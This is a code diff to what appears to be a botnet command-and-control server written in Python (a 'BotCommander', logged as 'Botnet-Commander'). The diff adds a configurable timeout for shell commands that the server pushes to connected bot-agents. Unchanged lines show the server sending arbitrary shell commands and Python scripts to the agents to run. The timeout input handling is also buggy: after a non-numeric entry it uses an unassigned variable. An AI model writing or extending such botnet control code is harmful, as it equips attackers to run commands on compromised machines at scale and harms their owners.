@@ -20,18 +20,20 @@ def load_conf():
         log_dir = config_parser.get("CORE", "LOG_DIR")
         log_name = config_parser.get("CORE", "LOG_NAME")
         offline_tout = int(config_parser.get("CORE", "OFFLINE_TOUT"))
+        cmd_tout = int(config_parser.get("CORE", "CMD_TOUT"))
     except Exception as err:
         print("Error initializing CORE, Commander not started because config file could not be loaded. Unexpected "
               "exception occurred: {}".format(err))
         exit(5)
-    return host, port, log_level, log_dir, log_name, offline_tout
+    return host, port, log_level, log_dir, log_name, offline_tout, cmd_tout
 
 
 class BotCommander:
-    def __init__(self, host, port, offline_tout):
+    def __init__(self, host, port, offline_tout, cmd_tout):
         self.uuids = {}
         self.host = host
         self.port = port
+        self.cmd_tout = cmd_tout
         self.offline_tout = offline_tout
         self.sock = socket(AF_INET, SOCK_STREAM)
         loop = asyncio.new_event_loop()
@@ -127,6 +129,27 @@ class BotCommander:
             print("NOTE: There is no validation performed by commander in regards to your command, so insert a valid "
                   "one, if you insert an invalid one however you will just get the output and error for that command"
                   " sent back by bot-agent, this note is just FYI.")
+            print(f"The current timeout value for the commands to run on agents equal to {self.cmd_tout} seconds, this"
+                  f" can be changed in commander.ini or right now. If you change it now it will be updated with the"
+                  f" value from commander.ini when commander is restarted.")
+            msg = "Do you wish to change timeout value? [Y/N]: "
+            choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
+            match choice:
+                case "Y":
+                    msg = "Please specify a new value for timeout of commands in seconds: "
+                    value = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
+                    try:
+                        val = int(value)
+                    except ValueError:
+                        print("You have not inserted a digit, please insert a digit.")
+                        await self.__exec_shell_cmd()
+                    except Exception as err:
+                        print(
+                            f"An unexpected exception occurred while processing your choice. Please retry"
+                            f" This is the error: {err}")
+                    self.cmd_tout = val
+                case "N":
+                    pass
             while True:
                 msg = "Please insert the command you want to send to bot-agents: "
                 cmd = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
@@ -340,7 +363,7 @@ class BotCommander:
             d = {"message": f"{message}"}
         elif message == "exeCommand":
             cmd, = args
-            d = {"message": f"{message}", "command": cmd}
+            d = {"message": f"{message}", "command": cmd, "timeout": self.cmd_tout}
         elif message == "exePythonScript":
             path_to_script = args
             with open(path_to_script, 'r') as fh:
@@ -373,7 +396,7 @@ class BotCommander:
 
 
 if __name__ == "__main__":
-    HOST, PORT, LOG_LEVEL, LOG_DIR, LOG_NAME, OFFLINE_TOUT = load_conf()
+    HOST, PORT, LOG_LEVEL, LOG_DIR, LOG_NAME, OFFLINE_TOUT, CMD_TOUT = load_conf()
     logger = CoreLogger(LOG_LEVEL, LOG_DIR, LOG_NAME)
-    srv = BotCommander(HOST, PORT, OFFLINE_TOUT)
+    srv = BotCommander(HOST, PORT, OFFLINE_TOUT, CMD_TOUT)
     logger.core.info("Botnet-Commander exited")
